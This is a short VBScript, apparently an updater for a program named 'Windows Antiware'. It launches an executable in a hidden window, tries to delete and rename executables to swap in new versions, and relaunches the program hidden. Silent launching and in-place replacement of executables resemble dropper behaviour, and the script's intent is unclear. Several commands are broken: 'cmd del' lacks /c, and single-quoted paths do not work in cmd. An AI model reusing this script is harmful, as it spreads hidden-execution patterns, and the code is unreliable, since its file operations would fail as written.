CreateObject("WScript.Shell").Run "Windows Antiware C.exe", 0, False
Set komutlar = WScript.CreateObject("WScript.Shell")
komutlar.run "cmd del 'Windows Antiware.exe' 'Windows Antiware C.exe'"
komutlar.run "rename '%CD%\Windows Antiware 2.exe' 'Windows Antiware.exe'"
komutlar.run "rename '%CD%\Windows Antiware C2.exe' 'Windows Antiware C.exe'"
CreateObject("WScript.Shell").Run "Windows Antiware C.exe", 0, False
